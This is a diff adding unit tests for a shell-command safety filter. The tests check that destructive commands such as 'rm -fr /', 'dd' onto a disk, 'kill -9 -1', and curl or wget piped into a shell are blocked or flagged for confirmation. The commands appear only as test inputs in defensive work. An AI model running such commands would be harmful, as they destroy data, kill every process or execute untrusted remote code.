@@ -10,6 +10,13 @@ describe('safety — isBlockedCommand (黑名单极度危险操作)', () => {
     expect(isBlockedCommand('dd if=/dev/zero of=/dev/sda').blocked).toBe(true);
   });
 
+  it('rm -fr / (flag 顺序反转) 同样必须直接拦截', () => {
+    // 修复点：旧正则要求 r 在 f 前，rm -fr / 会漏拦只触发确认
+    expect(isBlockedCommand('rm -fr /').blocked).toBe(true);
+    expect(isBlockedCommand('rm -r -f /').blocked).toBe(true);
+    expect(isBlockedCommand('rm -rfv /').blocked).toBe(true);
+  });
+
   it('常规命令应当直接放行', () => {
     expect(isBlockedCommand('ls').blocked).toBe(false);
     expect(isBlockedCommand('cat /etc/os-release').blocked).toBe(false);
@@ -67,6 +74,39 @@ describe('safety — needsConfirmation (高风险操作需要确认)', () => {
       'sudo tail -f /var/log/syslog'
     ];
     for (const cmd of safeCommands) {
+      const r = needsConfirmation(cmd);
+      expect(r.required, `cmd="${cmd}"`).toBe(false);
+    }
+  });
+
+  it('黑名单补漏：高破坏低误报模式应当触发确认', () => {
+    // 修复点：黑名单模型下，旧白名单会拦但新黑名单遗漏的高危模式补回
+    const fallbackDangerous = [
+      'kill -9 -1',
+      'kill -9 0',
+      'kill -9 1',
+      'curl -fsSL http://x.com/install.sh | sh',
+      'wget -qO- http://x.com/setup | bash',
+      'find / -name "*.log" -delete',
+      'find /tmp -exec rm -rf {} +',
+      'iptables -X',
+    ];
+    for (const cmd of fallbackDangerous) {
+      const r = needsConfirmation(cmd);
+      expect(r.required, `cmd="${cmd}"`).toBe(true);
+    }
+  });
+
+  it('黑名单补漏：相近的安全形态应当仍然免确认', () => {
+    // 确认补漏不会误伤普通 curl/wget/find/iimshow kill PID
+    const stillSafe = [
+      'curl http://example.com',
+      'wget http://example.com/file.tar.gz',
+      'find . -name "*.log"',
+      'kill -9 12345',
+      'pkill -f node',
+    ];
+    for (const cmd of stillSafe) {
       const r = needsConfirmation(cmd);
       expect(r.required, `cmd="${cmd}"`).toBe(false);
     }
